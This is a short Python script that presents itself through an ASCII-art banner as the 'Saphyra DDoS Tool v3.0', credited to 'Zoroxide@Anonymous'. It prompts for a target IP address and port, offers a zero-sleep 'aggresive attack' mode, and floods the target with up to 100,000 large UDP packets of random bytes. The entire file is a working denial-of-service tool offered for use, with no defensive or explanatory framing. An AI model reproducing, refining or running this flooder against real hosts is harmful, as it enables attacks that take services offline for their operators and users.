import socket
import random
import time

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
print(\
"""

                                ,-.
                               ( O_)
                              / `-/
                             /-. /
                            /   )
                           /   /  
              _           /-. /
             (_)*-._     /   )
               *-._ *-'**( )/    
                   *-/*-._* `. 
                    /     *-.'._
                   /\       /-._*-._
    _,---...__    /  ) _,-*/    *-(_)
___<__(|) _   **-/  / /   /
 '  `----' **-.   \/ /   /
               )  ] /   /
       ____..-'   //   /                       )
   ,-**      __.,'/   /   ___                 /,
  /    ,--**/  / /   /,-**   ***-.          ,'/
 [    (    /  / /   /  ,.---,_   `._   _,-','
  \    `-./  / /   /  /       `-._  *** ,-'
   `-._  /  / /   /_,'            **--*
       */  / /   /*         
       /  / /   /
      /  / /   /  
     /  |,'   /  
    :   /    /
    [  /   ,'     ~>Saphyra DDoS Tool v3.0<~
    | /  ,'      ~~>Created By Zoroxide@Anonymous<~~
    |/,-'        
    '
                                                       
""" )
time.sleep(1)
ip = input("Target IP: ")
port = int(input("Target Port: "))
sleep = float(input("Sleep (Put it 0 for aggresive attack): "))

s.connect((ip, port))

for i in range(1, 100 * 1000):
  s.send(random._urandom(10) * 1000)
  print(f"Send: {i}", end='\r')
  time.sleep(sleep)